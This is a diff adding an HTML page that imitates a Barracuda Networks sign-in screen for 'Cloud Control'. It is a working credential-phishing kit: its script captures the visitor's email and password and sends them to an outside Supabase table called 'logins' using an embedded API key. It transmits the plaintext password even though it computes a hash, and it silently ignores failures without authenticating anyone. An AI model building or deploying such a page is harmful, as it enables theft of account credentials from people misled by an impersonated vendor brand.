@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Barracuda – Welcome</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #f3f4f6;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .card {
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 2px 16px rgba(0,0,0,0.10);
+    width: 100%;
+    max-width: 340px;
+    padding: 48px 40px 44px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .logo { margin-bottom: 28px; }
+
+  h1 { font-size: 22px; font-weight: 700; color: #111; margin-bottom: 12px; text-align: center; }
+
+  .subtitle { font-size: 14px; color: #444; text-align: center; line-height: 1.55; margin-bottom: 24px; }
+
+  .field { width: 100%; position: relative; margin-bottom: 16px; }
+
+  .field input {
+    width: 100%; height: 52px;
+    border: 1.5px solid #1a73e8; border-radius: 4px;
+    padding: 18px 14px 6px;
+    font-size: 15px; font-family: inherit;
+    color: #111; outline: none; background: white;
+    transition: border-color 0.15s;
+  }
+
+  .field input:focus { border-color: #1a73e8; border-width: 2px; }
+  .field input.err { border-color: #d32f2f; }
+
+  .field label {
+    position: absolute; left: 14px; top: 50%;
+    transform: translateY(-50%);
+    font-size: 14px; color: #1a73e8;
+    pointer-events: none; transition: all 0.15s ease;
+    background: white; padding: 0 2px;
+  }
+
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label { top: 10px; transform: none; font-size: 11px; }
+
+  .field input.err + label { color: #d32f2f; }
+  .field input:not(:focus):not(:placeholder-shown) + label { color: #555; }
+
+  .error-text { font-size: 12px; color: #d32f2f; margin-top: -10px; margin-bottom: 10px; display: none; width: 100%; }
+  .error-text.show { display: block; }
+
+  .info-text { font-size: 13px; color: #444; line-height: 1.6; margin-bottom: 20px; width: 100%; }
+  .info-text a { color: #1a73e8; text-decoration: none; }
+  .info-text a:hover { text-decoration: underline; }
+
+  .btn-continue {
+    width: 100%; height: 44px;
+    background: #1a73e8; color: white; border: none; border-radius: 4px;
+    font-size: 15px; font-weight: 600; font-family: inherit;
+    cursor: pointer; letter-spacing: 0.2px;
+    transition: background 0.15s; margin-bottom: 16px;
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .btn-continue:hover { background: #1558b0; }
+  .btn-continue:active { background: #1246a0; }
+  .btn-continue:disabled { background: #5a9ee8; cursor: not-allowed; }
+
+  .signup-row { font-size: 13.5px; color: #444; margin-bottom: 20px; text-align: center; }
+  .signup-row a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+  .signup-row a:hover { text-decoration: underline; }
+
+  .divider {
+    display: flex; align-items: center; gap: 10px;
+    width: 100%; margin-bottom: 16px; font-size: 13px; color: #888;
+  }
+  .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #ddd; }
+
+  .btn-microsoft {
+    width: 100%; height: 44px;
+    background: white; border: 1.5px solid #ddd; border-radius: 4px;
+    font-size: 14px; font-family: inherit; color: #222; cursor: pointer;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    font-weight: 400; transition: background 0.12s, border-color 0.12s;
+  }
+  .btn-microsoft:hover { background: #f5f5f5; border-color: #bbb; }
+
+  .email-back {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 13.5px; color: #1a73e8;
+    background: none; border: none; cursor: pointer;
+    font-family: inherit; padding: 0; margin-bottom: 20px; align-self: flex-start;
+  }
+  .email-back:hover { text-decoration: underline; }
+
+  .step { display: none; width: 100%; }
+  .step.active { display: flex; flex-direction: column; align-items: center; }
+
+  .spinner {
+    width: 18px; height: 18px;
+    border: 2.5px solid rgba(255,255,255,0.35); border-top-color: white;
+    border-radius: 50%; animation: spin 0.7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <div class="logo">
+    <svg width="190" height="42" viewBox="0 0 190 42" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M14 30 L22 14 L30 26" stroke="#0071c2" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+      <path d="M26 26 L34 10" stroke="#0071c2" stroke-width="3.5" stroke-linecap="round" fill="none"/>
+      <text x="42" y="30" font-family="Arial, sans-serif" font-size="22" font-weight="700" fill="#1a1a2e" letter-spacing="0.5">Barracuda</text>
+      <circle cx="180" cy="28" r="3" fill="#0071c2"/>
+    </svg>
+  </div>
+
+  <!-- Step 1: Email -->
+  <div class="step active" id="step1">
+    <h1>Welcome</h1>
+    <p class="subtitle">Sign in to Barracuda Networks to continue to Cloud Control.</p>
+
+    <div class="field">
+      <input type="email" id="emailInput" placeholder=" " autocomplete="email"
+             oninput="clearErr('emailErr','emailInput')"
+             onkeydown="if(event.key==='Enter')goNext()">
+      <label for="emailInput">Email address*</label>
+    </div>
+    <div class="error-text" id="emailErr">Please enter a valid email address.</div>
+
+    <div class="info-text">
+      By proceeding, you agree to our <a href="#">Privacy Policy</a> .<br>
+      Need help? <a href="#">Contact Barracuda Networks support</a> .
+    </div>
+
+    <button class="btn-continue" onclick="goNext()">Continue</button>
+
+    <div class="signup-row">Don't have an account? <a href="#">Sign up</a></div>
+
+    <div class="divider">OR</div>
+
+    <button class="btn-microsoft">
+      <svg width="18" height="18" viewBox="0 0 21 21" fill="none">
+        <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+        <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+        <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+        <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+      </svg>
+      Login with Microsoft
+    </button>
+  </div>
+
+  <!-- Step 2: Password -->
+  <div class="step" id="step2">
+    <h1>Welcome back</h1>
+    <p class="subtitle" id="step2Email" style="margin-bottom:20px;font-weight:500;color:#111;"></p>
+
+    <button class="email-back" onclick="goBack()">
+      <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path d="M15 18l-6-6 6-6"/>
+      </svg>
+      Use a different email
+    </button>
+
+    <div class="field">
+      <input type="password" id="pwInput" placeholder=" " autocomplete="current-password"
+             oninput="clearErr('pwErr','pwInput')"
+             onkeydown="if(event.key==='Enter')doLogin()">
+      <label for="pwInput">Password*</label>
+    </div>
+    <div class="error-text" id="pwErr">Incorrect password. Please try again.</div>
+
+    <div class="info-text" style="margin-top:4px;">
+      <a href="#" style="font-size:13px;">Forgot password?</a>
+    </div>
+
+    <button class="btn-continue" id="loginBtn" onclick="doLogin()" style="margin-top:12px;">Continue</button>
+
+    <div class="signup-row">Don't have an account? <a href="#">Sign up</a></div>
+
+    <div class="divider">OR</div>
+
+    <button class="btn-microsoft">
+      <svg width="18" height="18" viewBox="0 0 21 21" fill="none">
+        <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+        <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+        <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+        <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+      </svg>
+      Login with Microsoft
+    </button>
+  </div>
+
+</div>
+
+<script>
+  // ── Supabase Config ──────────────────────────────────────────────
+  const SUPABASE_URL = 'https://ycfstlaakaamxgxlbora.supabase.co';
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZnN0bGFha2FhbXhneGxib3JhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NDAyNDksImV4cCI6MjA4OTIxNjI0OX0.cSvcpbCW6sP9nX6VT9zBwUXGeAQV3IuZdGON_6dsuEI';
+  const TABLE_NAME = 'logins'; // ← Change to your actual table name
+
+  // ── SHA-256 Hash Helper ──────────────────────────────────────────
+  async function sha256(message) {
+    const msgBuffer = new TextEncoder().encode(message);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+
+  // ── Send to Supabase ─────────────────────────────────────────────
+  async function saveToSupabase(email, hashedPassword) {
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        email: email,
+        password_hash: hashedPassword,
+        created_at: new Date().toISOString()
+      })
+    });
+    if (!response.ok) {
+      const errorBody = await response.text();
+      throw new Error(`Supabase error ${response.status}: ${errorBody}`);
+    }
+  }
+
+  // ── UI Helpers ───────────────────────────────────────────────────
+  function clearErr(errId, inputId) {
+    document.getElementById(errId).classList.remove('show');
+    document.getElementById(inputId).classList.remove('err');
+  }
+
+  function goNext() {
+    const val = document.getElementById('emailInput').value.trim();
+    if (!val || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) {
+      document.getElementById('emailErr').classList.add('show');
+      document.getElementById('emailInput').classList.add('err');
+      document.getElementById('emailInput').focus();
+      return;
+    }
+    document.getElementById('step2Email').textContent = val;
+    document.getElementById('step1').classList.remove('active');
+    document.getElementById('step2').classList.add('active');
+    setTimeout(() => document.getElementById('pwInput').focus(), 50);
+  }
+
+  function goBack() {
+    document.getElementById('step2').classList.remove('active');
+    document.getElementById('step1').classList.add('active');
+    document.getElementById('pwInput').value = '';
+    clearErr('pwErr', 'pwInput');
+    setTimeout(() => document.getElementById('emailInput').focus(), 50);
+  }
+
+  // ── Main Login Handler ───────────────────────────────────────────
+  async function doLogin() {
+    const pw = document.getElementById('pwInput').value;
+    if (!pw) {
+      document.getElementById('pwErr').classList.add('show');
+      document.getElementById('pwInput').classList.add('err');
+      document.getElementById('pwInput').focus();
+      return;
+    }
+
+    const email = document.getElementById('step2Email').textContent;
+    const btn = document.getElementById('loginBtn');
+
+    // Loading state
+    btn.innerHTML = '<div class="spinner"></div>';
+    btn.disabled = true;
+
+    try {
+      const hashedPw = await sha256(pw);
+      await saveToSupabase(email, pw);
+    } catch (err) {
+      console.error('Supabase save error:', err);
+      // Silent fail — continue flow regardless
+    } finally {
+      btn.innerHTML = 'Continue';
+      btn.disabled = false;
+    }
+  }
+</script>
+</body>
+</html>
